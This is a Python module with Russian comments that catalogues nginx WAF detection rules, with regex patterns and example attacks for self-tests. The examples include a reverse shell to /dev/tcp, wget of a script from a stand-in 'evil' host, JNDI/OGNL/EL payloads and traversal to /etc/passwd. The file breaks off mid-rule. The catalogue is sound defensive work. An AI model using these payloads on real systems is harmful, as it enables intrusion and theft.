"""Каталог правил фильтра запросов (WAF).

Правила — регулярные выражения PCRE (без учёта регистра) для карт `map` nginx: проверяются строка запроса как она
пришла ($request_uri — путь и параметры в URL-кодировке), заголовки User-Agent, Referer, Cookie, X-Forwarded-For,
Content-Type и некоторые другие. Тело запроса nginx без сторонних модулей не проверяет (см. ModSecurity в
документации) — поэтому атаки через POST-формы ловятся только по признакам в URL и заголовках.

Каждое правило: идентификатор, категория, уровень строгости (1 — почти без ложных срабатываний, 2 — строже),
проверяемые поля, шаблон, примеры атаки (для автотестов и самопроверки) и, для виртуальных патчей, номер CVE.
Шаблоны учитывают URL-кодировку (%27, %3c, %2e…) и двойную кодировку там, где её используют для обхода фильтров.
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Dict, List, Tuple

# --- строительные блоки шаблонов (URL-кодированные варианты символов) ---
SP = r"(?:\s|%20|\+|%09|%0a|%0d|%0b|%0c|/\*.*?\*/|%2f\*.*?\*%2f)"  # пробел и его заменители в SQL
Q = r"(?:'|%27|%2527|\"|%22|`|%60)"                                # кавычки
LT = r"(?:<|%3c|%253c|\\x3c|\\u003c|&lt;?|%26lt%3b)"               # <
LP = r"(?:\(|%28)"                                                 # (
EQ = r"(?:=|%3d)"                                                  # =
SL = r"(?:/|%2f|%252f)"                                            # /
DOT = r"(?:\.|%2e|%252e|%c0%ae|%u002e)"                            # .
BS = r"(?:\\|%5c|%255c)"                                           # обратная косая
DOL = r"(?:\$|%24)"                                                # $
LB = r"(?:\{|%7b)"                                                 # {
COL = r"(?::|%3a)"                                                 # :

TARGETS: Dict[str, Tuple[str, str]] = {
    # код поля → (переменная nginx, подпись)
    "uri": ("$request_uri", "строка запроса (путь и параметры)"),
    "ua": ("$http_user_agent", "User-Agent"),
    "ref": ("$http_referer", "Referer"),
    "cookie": ("$http_cookie", "Cookie"),
    "xff": ("$http_x_forwarded_for", "X-Forwarded-For"),
    "ctype": ("$http_content_type", "Content-Type"),
    "xapi": ("$http_x_api_version", "X-Api-Version"),
    "method": ("$request_method", "метод запроса"),
    "te": ("$server_protocol|$http_transfer_encoding", "протокол и Transfer-Encoding"),
    "nextmw": ("$http_x_middleware_subrequest", "X-Middleware-Subrequest"),
    "xmo": ("$http_x_http_method_override$http_x_method_override", "X-HTTP-Method-Override"),
}

CATEGORIES: Dict[str, Dict[str, str]] = {
    "sqli": {"title": "SQL-инъекции", "default": "block",
             "doc": "Внедрение SQL-кода в параметры: UNION SELECT, логические условия, задержки (слепые инъекции), "
                    "служебные таблицы, вызовы функций СУБД. OWASP A03, CWE-89."},
    "xss": {"title": "Межсайтовый скриптинг (XSS)", "default": "block",
            "doc": "Внедрение HTML и JavaScript: теги script/iframe/svg, обработчики событий, javascript:-ссылки, "
                   "доступ к cookie. OWASP A03, CWE-79."},
    "traversal": {"title": "Обход каталогов и чтение файлов (LFI)", "default": "block",
                  "doc": "../ в разных кодировках, системные файлы (/etc/passwd, /proc/self/environ, win.ini). "
                         "OWASP A01, CWE-22."},
    "rfi": {"title": "Подключение удалённых файлов (RFI) и обёртки PHP", "default": "block",
            "doc": "URL другого сервера в параметре, оканчивающийся на «?», и обёртки php://, data://, "
                   "expect://, phar://. CWE-98."},
    "rce": {"title": "Внедрение команд ОС (RCE)", "default": "block",
            "doc": "Команды оболочки после ; | && $( и обратных кавычек, пути к интерпретаторам, /dev/tcp, "
                   "Shellshock в заголовках. OWASP A03, CWE-78."},
    "php": {"title": "Внедрение PHP-кода", "default": "block",
            "doc": "<?php, вызовы eval/system/passthru/base64_decode, изменение php.ini через параметры "
                   "(allow_url_include, auto_prepend_file). CWE-94."},
    "java": {"title": "Java: JNDI (Log4Shell), OGNL, EL, десериализация", "default": "block",
             "doc": "${jndi:…} и его обфускации, выражения OGNL (Struts, Confluence), Spring EL, "
                    "сериализованные объекты Java (rO0AB), Spring4Shell, Text4Shell. CWE-917, CWE-502."},
    "ssrf": {"title": "Подделка запросов сервера (SSRF)", "default": "block",
             "doc": "Адреса метаданных облаков (169.254.169.254, metadata.google.internal), схемы gopher:// и "
                    "dict://, на уровне 2 — localhost и 127.0.0.1 в параметрах. OWASP A10, CWE-918."},
    "nosqli": {"title": "NoSQL-инъекции", "default": "block",
               "doc": "Операторы MongoDB в параметрах: [$ne], [$gt], [$regex], $where. CWE-943."},
    "crlf": {"title": "Внедрение заголовков (CRLF)", "default": "block",
             "doc": "Перевод строки в URL (%0d%0a) для подделки заголовков ответа и cookie — HTTP response "
                    "splitting. CWE-113."},
    "pollution": {"title": "Загрязнение прототипа (JavaScript)", "default": "block",
                  "doc": "__proto__, constructor.prototype в параметрах — атака на приложения Node.js. CWE-1321."},
    "ssti": {"title": "Внедрение в шаблоны (SSTI)", "default": "block",
             "doc": "Выражения шаблонизаторов: {{7*7}}, обход объектов Python (__class__, __globals__), "
                    "${…} и <%= … %> на уровне 2. CWE-1336."},
    "xxe": {"title": "XXE, LDAP- и XPath-инъекции", "default": "block",
            "doc": "Объявления сущностей XML (<!ENTITY, <!DOCTYPE … [) в URL; на уровне 2 — LDAP- и "
                   "XPath-инъекции. CWE-611, CWE-90, CWE-643."},
    "scanners": {"title": "Сканеры уязвимостей", "default": "block",
                 "doc": "Инструменты атакующих по User-Agent (sqlmap, nikto, nuclei, nmap, masscan, wpscan, "
                        "acunetix…) и их характерные запросы; на уровне 2 — пустой User-Agent и "
                        "исследовательские сканеры интернета."},
    "files": {"title": "Служебные и секретные файлы", "default": "block",
              "doc": "Каталоги систем контроля версий (.git, .svn), файлы окружения (.env), ключи, резервные "
                     "копии и дампы баз (.bak, .sql, backup.zip), конфигурации, отладочные страницы "
                     "(phpinfo, server-status). На уровне 2 — панели администрирования БД и actuator."},
    "webshells": {"title": "Веб-шеллы и бэкдоры", "default": "block",
                  "doc": "Обращения к известным веб-шеллам (c99, r57, wso, b374k, alfa…) и передача команд "
                         "PHP-скриптам."},
    "cve": {"title": "Виртуальные патчи (известные CVE)", "default": "block",
            "doc": "Сигнатуры эксплуатации конкретных уязвимостей популярного ПО: Apache, Confluence, Citrix, "
                   "F5, Fortinet, Exchange, PHP-CGI, Ivanti, Next.js, SharePoint и др. Закрывают уязвимость на "
                   "входе, пока приложение не обновлено."},
    "protocol": {"title": "Нарушения протокола HTTP", "default": "block",
                 "doc": "Нестандартные методы (TRACE, TRACK, CONNECT, DEBUG, WebDAV), нулевой байт, "
                        "«длинная» UTF-8, двойная URL-кодировка служебных символов, Transfer-Encoding в "
                        "HTTP/1.0 и нестандартный Transfer-Encoding (контрабанда запросов). На уровне 2 — "
                        "X-HTTP-Method-Override и очень длинные URL."},
    "vuln": {"title": "Эксплойты известных уязвимостей (база, обновляется)", "default": "detect",
             "doc": "Пути, по которым эксплуатируют уязвимости из каталога CISA KEV и шаблонов nuclei-templates: "
                    "обновляются автоматически (раздел «Уязвимости»). Точное совпадение пути; для уязвимостей с "
                    "эксплойтом в параметрах — ещё и признак атаки в параметрах. По умолчанию только запись в "
                    "журнал — так видно, какие уязвимости ищут на сайтах."},
    "redirect": {"title": "Открытые перенаправления", "default": "detect",
                 "doc": "Параметры redirect/url/next/return со ссылкой на другой сайт (//evil.com). Возможны "
                        "ложные срабатывания на OAuth и SSO, поэтому по умолчанию только запись в журнал. CWE-601."},
    "bots_ai": {"title": "Боты ИИ-компаний", "default": "off",
                "doc": "Сборщики данных для обучения и поиска ИИ: GPTBot, ClaudeBot, CCBot, Bytespider, "
                       "PerplexityBot, Amazonbot, meta-externalagent и др. Решение — за владельцем сайта."},
    "bots_seo": {"title": "SEO-боты и сборщики ссылок", "default": "off",
                 "doc": "AhrefsBot, SemrushBot, MJ12bot, DotBot, BLEXBot, DataForSeoBot и др. — создают "
                        "нагрузку, но не приводят посетителей."},
    "bots_libs": {"title": "HTTP-библиотеки и автоматизация", "default": "off",
                  "doc": "python-requests, curl, wget, Go-http-client, Scrapy, HeadlessChrome, PhantomJS… "
                         "Не включайте для API и сайтов, к которым обращаются скрипты."},
}

MODES = {"off": "выключено", "detect": "только запись в журнал", "block": "блокировать"}


@dataclass
class Rule:
    id: str
    cat: str
    title: str
    pattern: str
    targets: Tuple[str, ...] = ("uri",)
    level: int = 1
    examples: Tuple[str, ...] = ()          # значения поля (для uri — путь с параметрами), которые правило ловит
    cve: str = ""
    flags: str = "~*"                        # ~* — без учёта регистра, ~ — с учётом, "=" — точное значение
    note: str = ""

    def compiled(self) -> "re.Pattern":
        return re.compile(self.pattern, 0 if self.flags == "~" else re.I)


def R(id, cat, title, pattern, *, t=("uri",), lvl=1, ex=(), cve="", flags="~*", note=""):
    return Rule(id, cat, title, pattern, tuple(t), lvl, tuple(ex), cve, flags, note)


HDR = ("uri", "ua", "ref", "cookie", "xff", "xapi")

RULES: List[Rule] = [
    # ------------------------------------------------------------------ SQL
    R("sqli-union", "sqli", "UNION SELECT", rf"union{SP}+(?:all{SP}+|distinct{SP}+)?{LP}?{SP}*select{SP}",
      ex=("/item?id=1+UNION+ALL+SELECT+1,2,3--", "/?q=1%20union%20select%20null,version()")),
    R("sqli-schema", "sqli", "Служебные таблицы СУБД",
      r"information_schema|sysobjects|syscolumns|pg_catalog|pg_shadow|sqlite_master|mysql\.user|"
      r"xp_cmdshell|sp_executesql|dbms_pipe|utl_http",
      ex=("/?id=1 and 1=(select count(*) from information_schema.tables)",)),
    R("sqli-time", "sqli", "Слепая инъекция по времени",
      rf"(?:sleep|benchmark|pg_sleep|dbms_lock\.sleep){SP}*{LP}{SP}*\d|waitfor{SP}+delay{SP}",
      ex=("/?id=1%27%20AND%20SLEEP(5)--", "/?id=1;waitfor delay '0:0:5'--")),
    R("sqli-bool", "sqli", "Логическое условие после кавычки",
      rf"{Q}{SP}*(?:or|and|xor|\|\||&&|%7c%7c|%26%26){SP}+{Q}?[\w-]+{Q}?{SP}*(?:=|%3d|<|>|%3c|%3e|like{SP}|rlike{SP}|regexp{SP})",
      ex=("/login?user=admin%27%20OR%20%271%27=%271", "/?id=1' or 1=1--")),
    R("sqli-stacked", "sqli", "Вторая команда после ;",
      rf"(?:;|%3b){SP}*(?:drop|truncate|alter|create|insert|update|delete|exec|execute|declare|shutdown|grant)"
      rf"{SP}+(?:table|database|from|into|user|@|\w+{SP})",
      ex=("/?id=1;DROP TABLE users", "/?q=x%3B%20delete%20from%20orders")),
    R("sqli-funcs", "sqli", "Функции извлечения данных",
      rf"(?:concat|group_concat|concat_ws|load_file|extractvalue|updatexml|make_set|json_keys|"
      rf"char|unhex|cast|convert){SP}*{LP}{SP}*(?:0x|char{SP}*{LP}|select{SP}|@@|version{SP}*{LP}|user{SP}*{LP}|"
      rf"database{SP}*{LP}|{Q}~{Q})|@@version|into{SP}+(?:out|dump)file",
      ex=("/?id=extractvalue(1,concat(0x7e,version()))", "/?id=1 into outfile '/tmp/x'")),
    R("sqli-comment", "sqli", "Кавычка и комментарий SQL", rf"{Q}{SP}*(?:--|%2d%2d|#|%23|/\*|%2f\*)", lvl=2,
      ex=("/?user=admin'--",)),
    R("sqli-hex", "sqli", "Длинная шестнадцатеричная строка", r"(?:=|%3d)0x[0-9a-f]{16,}", lvl=2,
      ex=("/?id=0x73656c65637420757365726e616d65",)),
    # ------------------------------------------------------------------ XSS
    R("xss-script", "xss", "Тег script", rf"{LT}(?:{SL})?{SP}*script", t=("uri", "ref"),
      ex=("/search?q=<script>alert(1)</script>", "/?q=%3Cscript%3Ealert(document.domain)%3C/script%3E")),
    R("xss-event", "xss", "Обработчик события в теге",
      rf"{LT}[a-z0-9]+[^&]*?(?:\s|%20|/|%2f|%09|%0a|%0c|\+)on[a-z]{{3,30}}(?:\s|%20|\+)*(?:=|%3d)",
      t=("uri", "ref"), ex=("/?q=<img src=x onerror=alert(1)>", "/?q=%3Csvg%2Fonload%3Dalert(1)%3E")),
    R("xss-proto", "xss", "Опасная схема в ссылке",
      rf"(?:javascript|vbscript|livescript|mocha){COL}|data{COL}(?:text/html|image/svg|application/(?:x-)?javascript)",
      ex=("/?url=javascript:alert(1)", "/?u=data:text/html;base64,PHNjcmlwdD4=")),
    R("xss-tags", "xss", "Опасные теги", rf"{LT}{SP}*(?:iframe|object|embed|svg|applet|base|frameset|isindex)\b",
      t=("uri", "ref"), ex=("/?q=<iframe src=//evil>", "/?q=%3Csvg%3E")),
    R("xss-dom", "xss", "Доступ к cookie и вызовы alert/prompt",
      rf"document{DOT}(?:cookie|domain|write)|window{DOT}location|(?:alert|prompt|confirm|eval|settimeout)"
      rf"(?:\s|%20)*{LP}|string{DOT}fromcharcode|atob{LP}",
      ex=("/?q=document.cookie", "/?q=alert(1)")),
    R("xss-tags2", "xss", "Теги meta, link, form, math, style", rf"{LT}{SP}*(?:meta|link|form|math|style|marquee)\b",
      lvl=2, ex=("/?q=<meta http-equiv=refresh>",)),
    R("xss-css", "xss", "CSS-выражения", r"expression(?:\s|%20)*(?:\(|%28)|-moz-binding|behavior(?:\s|%20)*:",
      lvl=2, ex=("/?s=x:expression(alert(1))",)),
    # ------------------------------------------------------------------ обход каталогов
    R("trav-dotdot", "traversal", "../ в любой кодировке", rf"{DOT}{DOT}(?:{SL}|{BS}|%c0%af|%c1%9c)",
      ex=("/download?file=../../etc/passwd", "/static/%2e%2e%2f%2e%2e%2fetc/passwd", "/a/..%5c..%5cwin.ini")),
    R("trav-files", "traversal", "Системные файлы",
      rf"{SL}etc{SL}(?:passwd|shadow|group|hosts|issue|crontab|sudoers)|{SL}proc{SL}(?:self|\d+){SL}"
      rf"(?:environ|cmdline|maps|fd|status|mem)|(?:windows|winnt){SL}(?:win\.ini|system32)|boot\.ini|"
      rf"{SL}var{SL}log{SL}|\bc:{BS}",
      ex=("/?page=/etc/passwd", "/?f=/proc/self/environ", "/?f=C:%5Cwindows%5Cwin.ini")),
    # ------------------------------------------------------------------ RFI
    R("rfi-url", "rfi", "Чужой URL, оканчивающийся на ?",
      rf"{EQ}(?:https?|ftps?){COL}{SL}{SL}[^&]*?(?:\?|%3f)(?:&|$)",
      ex=("/index.php?page=http://evil.example/shell.txt?",)),
    R("rfi-wrappers", "rfi", "Обёртки PHP и подобные схемы",
      rf"(?:php|data|expect|zip|phar|glob|zlib|compress\.zlib|ogg|rar|ssh2|file){COL}{SL}{SL}|php{COL}{SL}{SL}"
      r"(?:filter|input|fd|memory|temp)",
      ex=("/?page=php://filter/convert.base64-encode/resource=index.php", "/?f=file:///etc/passwd",
          "/?x=expect://id")),
    # ------------------------------------------------------------------ RCE
    R("rce-chain", "rce", "Команда после ; | &&",
      rf"(?:;|%3b|\||%7c|&&|%26%26|\|\||%7c%7c){SP}*(?:cat|wget|curl|nc|ncat|netcat|bash|sh|zsh|ksh|python[23]?|"
      rf"perl|ruby|php|id|uname|whoami|ifconfig|ping|nslookup|dig|chmod|chown|rm|echo|base64|powershell|"
      rf"cmd(?:\.exe)?|telnet|tftp|busybox|uname){SP}+[^&\s%]",
      ex=("/?ip=127.0.0.1;cat /etc/passwd", "/ping?host=8.8.8.8%7Cwget%20http://evil/x.sh",
          "/?h=x%3Bid%20-a")),
    R("rce-subst", "rce", "Подстановка команды $(…) и `…`",
      rf"(?:\$\(|%24%28|`|%60)(?:{SP})*(?:cat|wget|curl|nc|bash|sh|id|uname|whoami|sleep|ping|nslookup|"
      rf"echo|python|perl|base64)\b",
      ex=("/?q=$(id)", "/?q=%60whoami%60")),
    R("rce-paths", "rce", "Интерпретаторы и /dev/tcp",
      rf"{SL}(?:bin|usr{SL}bin|usr{SL}local{SL}bin){SL}(?:sh|bash|dash|zsh|nc|ncat|wget|curl|python[23]?|perl|"
      rf"php|busybox)\b|{SL}dev{SL}(?:tcp|udp){SL}|cmd(?:\.exe)?(?:\s|%20|\+)+/c(?:\s|%20|\+)",
      ex=("/?cmd=/bin/bash%20-i", "/?x=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")),
    R("rce-shellshock", "rce", "Shellshock в заголовках (CVE-2014-6271)", r"\(\s*\)\s*\{", t=("ua", "ref", "cookie"),
      cve="CVE-2014-6271", ex=("() { :; }; /bin/bash -c 'id'",)),
    # ------------------------------------------------------------------ PHP
    R("php-tag", "php", "Тег <?php", r"<\?php|%3c%3fphp|<\?=|%3c%3f%3d", t=("uri", "ua", "ref", "cookie"),
      ex=("/?x=<?php system('id'); ?>", "/?x=%3C%3Fphp%20phpinfo()%3B")),
    R("php-funcs", "php", "Опасные функции PHP",
      rf"\b(?:phpinfo|system|passthru|shell_exec|exec|popen|proc_open|pcntl_exec|assert|create_function|"
      rf"call_user_func(?:_array)?|preg_replace|base64_decode|gzinflate|str_rot13|file_put_contents|"
      rf"move_uploaded_file|fsockopen){SP}*{LP}",
      ex=("/?code=system('ls')", "/?x=base64_decode(%22ZWNobyAx%22)")),
    R("php-ini", "php", "Изменение настроек PHP через параметры",
      r"(?:allow_url_include|allow_url_fopen|auto_prepend_file|auto_append_file|safe_mode|disable_functions|"
      r"open_basedir|suhosin\.)(?:=|%3d|\+|%20)",
      ex=("/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",)),
    R("php-superglobals", "php", "Суперглобальные массивы в параметрах",
      r"(?:^|[?&])(?:_get|_post|_request|_server|_cookie|_session|_files|_env|globals)(?:\[|%5b)", lvl=2,
      ex=("/?GLOBALS[x]=1",)),
    # ------------------------------------------------------------------ Java
    R("java-jndi", "java", "JNDI-подстановка (Log4Shell)",
      rf"{DOL}{LB}(?:[^}}]|%7d){{0,120}}?(?:jndi|j(?:\$|%24)(?:\{{|%7b)|lower{COL}|upper{COL}|::-|env{COL}|sys{COL}|"
      rf"date{COL}|main{COL}|base64{COL})",
      t=HDR, cve="CVE-2021-44228",
      ex=("${jndi:ldap://evil.example/a}", "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D",
          "${${lower:j}ndi:${lower:l}dap://x/a}", "${${::-j}${::-n}${::-d}${::-i}:rmi://x/a}")),
    R("java-ognl", "java", "Выражения OGNL (Struts, Confluence)",
      rf"%\{{|%25%7b|%25\{{|{DOL}{LB}{LP}(?:#|%23)|#_memberaccess|%23_memberaccess|@ognl|ognlcontext|"
      rf"(?:#|%23)context(?:\[|%5b)|(?:\(|%28)(?:#|%23)[a-z_]+(?:=|%3d)",
      t=("uri", "ctype", "ua", "ref", "cookie"), cve="CVE-2017-5638, CVE-2022-26134",
      ex=("/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id')))}",
          "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}")),
    R("java-el", "java", "Выражения Spring EL и Java-рефлексия",
      rf"(?:{DOL}|#|%23){LB}[^}}]{{0,200}}?(?:runtime|processbuilder|getclass|classloader|forname|newinstance|"
      r"getruntime|scriptengine)|java\.lang\.(?:runtime|processbuilder|system|reflect)",
      t=("uri", "ua", "ref", "cookie"),
      ex=("/?x=${T(java.lang.Runtime).getRuntime().exec('id')}", "/?q=#{''.getClass().forName('java.lang.Runtime')}")),
    R("java-spring4shell", "java", "Spring4Shell (CVE-2022-22965)",
      rf"class{DOT}module{DOT}classloader|class{DOT}classloader|classloader{DOT}resources",
      cve="CVE-2022-22965",
      ex=("/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",)),
    R("java-text4shell", "java", "Text4Shell (CVE-2022-42889)", rf"{DOL}{LB}(?:script|dns|url){COL}",
      t=("uri", "ua", "ref", "cookie"), cve="CVE-2022-42889",
      ex=("/?q=${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",)),
    R("java-deser", "java", "Сериализованный объект Java", r"ro0ab|aced0005|%ac%ed%00%05|h4sia",
      t=("uri", "cookie"), flags="~*",
      ex=("/?data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",)),
    # ------------------------------------------------------------------ SSRF
    R("ssrf-metadata", "ssrf", "Адреса метаданных облаков",
      r"169\.254\.169\.254|169\.254\.170\.2|metadata\.google\.internal|metadata\.azure\.com|100\.100\.100\.200|"
      r"fd00:ec2::254|instance-data|0xa9fea9fe|2852039166",
      ex=("/fetch?url=http://169.254.169.254/latest/meta-data/", "/?u=http://metadata.google.internal/")),
    R("ssrf-schemes", "ssrf", "Схемы gopher, dict, tftp, ldap",
      rf"{EQ}(?:gopher|dict|tftp|ldaps?|jar|netdoc|sftp){COL}{SL}{SL}",
      ex=("/?url=gopher://127.0.0.1:6379/_FLUSHALL",)),
    R("ssrf-local", "ssrf", "localhost и внутренние адреса в параметрах",
      rf"{EQ}(?:(?:https?|ftp){COL}{SL}{SL})?(?:127\.\d+\.\d+\.\d+|localhost|0\.0\.0\.0|\[::1?\]|0x7f|2130706433|"
      rf"\[::ffff:)", lvl=2, ex=("/proxy?url=http://127.0.0.1:8080/admin",)),
    # ------------------------------------------------------------------ NoSQL
    R("nosqli-ops", "nosqli", "Операторы MongoDB",
      rf"(?:\[|%5b){DOL}(?:ne|eq|gt|gte|lt|lte|in|nin|regex|where|exists|expr|function|or|and|not|elemmatch)"
      rf"(?:\]|%5d)|{DOL}where{EQ}|{DOL}(?:function|accumulator){COL}",
      ex=("/login?user=admin&password[$ne]=x", "/?q%5B%24regex%5D=.*")),
    # ------------------------------------------------------------------ CRLF
    R("crlf-split", "crlf", "Перевод строки в URL",
      r"%0d%0a|%0a%0d|%0d(?:%20|%09)*(?:set-cookie|location|content-|x-|refresh)|%0a(?:%20|%09)*(?:set-cookie|"
      r"location|content-|http/|refresh)|%e5%98%8a%e5%98%8d|%c4%8a",
      ex=("/redirect?url=/%0d%0aSet-Cookie:%20admin=1", "/?x=%E5%98%8A%E5%98%8DSet-Cookie:a=b")),
    # ------------------------------------------------------------------ prototype pollution
    R("proto-pollution", "pollution", "__proto__ и constructor.prototype",
      rf"__proto__|constructor(?:\]|%5d)?(?:\[|%5b|{DOT})prototype",
      ex=("/?__proto__[admin]=1", "/?constructor[prototype][isAdmin]=true")),
    # ------------------------------------------------------------------ SSTI
    R("ssti-python", "ssti", "Обход объектов Python (Jinja2, Mako)",
      r"__class__|__globals__|__builtins__|__subclasses__|__mro__|__init__\.__|__import__|lipsum\.__|"
      r"cycler\.__|request\.application\.__",
      ex=("/?name={{''.__class__.__mro__[1].__subclasses__()}}",)),
    R("ssti-math", "ssti", "Арифметика в фигурных скобках {{7*7}}",
      r"(?:\{\{|%7b%7b)(?:\s|%20)*\d+(?:\s|%20)*(?:\*|%2a)(?:\s|%20)*\d+(?:\s|%20)*(?:\}\}|%7d%7d)",
      ex=("/?name={{7*7}}", "/?n=%7B%7B7*7%7D%7D")),
    R("ssti-other", "ssti", "${7*7}, #{7*7}, <%= %>",
      r"(?:\$|#|%24|%23)(?:\{|%7b)(?:\s|%20)*\d+(?:\s|%20)*(?:\*|%2a)(?:\s|%20)*\d+|(?:<|%3c)%(?:=|%3d)|"
      r"\{%(?:\s|%20)*(?:import|include|set|for)", lvl=2, ex=("/?q=${7*7}", "/?q=<%= 7*7 %>")),
    # ------------------------------------------------------------------ XXE и др.
    R("xxe-entity", "xxe", "Сущности XML", rf"{LT}!(?:entity|doctype[^>]*?(?:\[|%5b|system|public))",
      t=("uri", "ctype"), ex=("/?xml=<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",)),
    R("ldap-inj", "xxe", "LDAP-инъекция", r"\*(?:\)|%29)(?:\(|%28)(?:\||%7c|&|%26)|(?:\)|%29)(?:\(|%28)(?:\||%7c)"
      r"(?:\(|%28)", lvl=2, ex=("/?user=*)(|(uid=*))",)),
    R("xpath-inj", "xxe", "XPath-инъекция",
      rf"{Q}{SP}*(?:or|and){SP}+(?:count|name|string-length|substring){LP}|/child::node{LP}", lvl=2,
      ex=("/?q=x' or count(/*)=1 or 'a'='b",)),
    # ------------------------------------------------------------------ сканеры
    R("scan-ua", "scanners", "Сканер уязвимостей по User-Agent",
      r"sqlmap|nikto|nessus|openvas|nmap scripting|masscan|zgrab|zmeu|nuclei|wpscan|joomscan|droopescan|"
      r"acunetix|netsparker|invicti|appscan|w3af|arachni|skipfish|dirbuster|\bdirb\b|gobuster|feroxbuster|"
      r"fuzz faster u fool|\bffuf\b|wfuzz|hydra|medusa|whatweb|wapiti|xsstrike|commix|jaeles|morfeus|"
      r"\bzap/|owasp zap|burp(?:suite)?\b|havij|pangolin|brutus|grabber|webinspect|paros|vega/|"
      r"metasploit|\bmsf\b|struts-pwn|log4j-scan|fimap|teh forest lobster|webshag|sqlninja|bbqsql|"
      r"pmafind|nmap|python-xss|hackertarget|isc ssl|go-ipfs|l9explore|l9tcpid|leakix",
      t=("ua",), ex=("sqlmap/1.7.2#stable (https://sqlmap.org)", "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
                     "Fuzz Faster U Fool v2.1.0", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)")),
    R("scan-probe", "scanners", "Характерные запросы сканеров",
      r"/nice%20ports%2c/tri%6eity\.txt|acunetix-wvs-test|netsparker|/appscan_fingerprint|wvstest=|"
      r"burpcollaborator|oastify\.com|interact\.sh|oast\.(?:fun|live|me|pro|site|online)|dnslog\.cn|"
      r"canarytokens|/\.well-known/security\.txt\.bak|xss\.ht|bxss\.me",
      t=("uri", "ua", "ref", "cookie", "xff"), ex=("/nice%20ports%2C/Tri%6Eity.txt%2ebak", "/?x=abc.oastify.com")),
    R("scan-noua", "scanners", "Пустой User-Agent", r"^$", t=("ua",), lvl=2, flags="~", ex=("",)),
    R("scan-research", "scanners", "Исследовательские сканеры интернета",
      r"censysinspect|expanse|internet-measurement|internetmeasurement|paloaltonetworks|shodan|binaryedge|"
      r"onyphe|criminalip|netcraftsurveyagent|zoomeye|fofa|quadmetrics|stretchoid|odin\.io|"
      r"modat scanner|ipip\.net|project sonar|researchscan",
      t=("ua",), lvl=2, ex=("Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",)),
    # ------------------------------------------------------------------ служебные файлы
    R("files-vcs", "files", "Системы контроля версий", r"/\.(?:git|svn|hg|bzr|cvs|darcs)(?:/|$|\?|%2f)",
      ex=("/.git/config", "/.svn/entries", "/.git/HEAD")),
    R("files-env", "files", "Файлы окружения, ключи и история команд",
      r"/\.(?:aws|docker|ssh|vscode|idea|kube|circleci|terraform\.d|gnupg|azure|config/gcloud)(?:/|%2f)|"
      r"/\.(?:env(?:\.[a-z0-9_-]+)?|npmrc|yarnrc|pypirc|netrc|htpasswd|htaccess|ds_store|bash_history|"
      r"zsh_history|mysql_history|psql_history|sh_history|terraform|gitconfig|git-credentials|travis\.yml|"
      r"gitlab-ci\.yml|boto|s3cfg|composer/auth\.json)(?:$|\?|/|%2f)",
      ex=("/.env", "/.env.production", "/.aws/credentials", "/.ssh/id_rsa", "/app/.git-credentials")),
    R("files-keys", "files", "Закрытые ключи и учётные данные",
      r"/(?:id_rsa|id_dsa|id_ecdsa|id_ed25519|authorized_keys|known_hosts|server\.key|private\.key|"
      r"privatekey\.pem|credentials\.json|service-account[^/]*\.json|secrets?\.(?:ya?ml|json|txt)|"
      r"wallet\.dat|keystore\.jks)(?:$|\?)",
      ex=("/id_rsa", "/config/credentials.json", "/secrets.yml")),
    R("files-backup", "files", "Резервные копии и дампы",
      r"\.(?:bak|backup|bkp|old|orig|original|save|sav|swp|swo|tmp|temp|copy|dist)(?:$|\?)|\.[a-z0-9]{1,5}~\d*(?:$|\?)|"
      r"/[^/?]+\.(?:sql|sql\.gz|sql\.bz2|sql\.zip|sql\.7z|dump|mdb|sqlite3?|db3?)(?:$|\?)|"
      r"/(?:backup|backups|bak|site|www|web|html|public_html|htdocs|wwwroot|db|database|dump|data|old|"
      r"archive|src|source|files|home|root|users)\.(?:zip|rar|7z|tar|tgz|gz|bz2|xz|tar\.gz|tar\.bz2)(?:$|\?)",
      ex=("/wp-config.php.bak", "/index.php~", "/dump.sql", "/backup.zip", "/www.tar.gz")),
    R("files-config", "files", "Файлы конфигурации приложений",
      r"/(?:wp-config\.php(?:\.|~|_|-)[a-z0-9]*|configuration\.php(?:\.|~|_)[a-z0-9]*|web\.config|appsettings(?:\.[a-z]+)?\.json|"
      r"(?:local_)?settings\.py|database\.yml|config/database\.yml|parameters\.yml|config\.inc\.php|"
      r"localsettings\.php|\.?config\.json\.bak|docker-compose\.ya?ml|dockerfile|vagrantfile|"
      r"phpunit\.xml|composer\.lock|package-lock\.json|yarn\.lock|gemfile\.lock|wp-config-sample\.php)(?:$|\?)",
      ex=("/web.config", "/docker-compose.yml", "/wp-config.php.save", "/composer.lock")),
    R("files-debug", "files", "Отладочные и служебные страницы",
      r"/(?:phpinfo\.php|info\.php|php_info\.php|i\.php|server-status|server-info|elmah\.axd|trace\.axd|"
      r"_ignition/|telescope/requests|horizon/api|jmx-console|web-console|invoker/|"
      r"manager/html|admin-console|status\.php\?full|__clockwork|debug/default/view|_wdt/)",
      ex=("/phpinfo.php", "/server-status", "/elmah.axd", "/_ignition/execute-solution")),
    R("files-admin", "files", "Панели администрирования БД и actuator",
      r"/(?:phpmyadmin|pma|myadmin|mysqladmin|dbadmin|sqlbuddy|websql|phppgadmin|adminer(?:-[\d.]+)?\.php|"
      r"actuator(?:/|$|\?)|_profiler|__debug__|debug/(?:pprof|vars)|console(?:/|$))", lvl=2,
      ex=("/phpmyadmin/index.php", "/actuator/env", "/adminer-4.8.1.php")),
    # ------------------------------------------------------------------ веб-шеллы
    R("shell-names", "webshells", "Известные веб-шеллы",
      r"/(?:c99|c100|r57|r58|wso|wso2(?:\.\d+)?|b374k|alfa(?:_data|shell)?|indoxploit|madspot|marijuana|priv8|"
      r"xleet|leaf(?:mailer)?|lufix|sh3ll|webshell|wp-shell|fox|mini|0x|404|ups|upl|uploader|cmd|shell|"
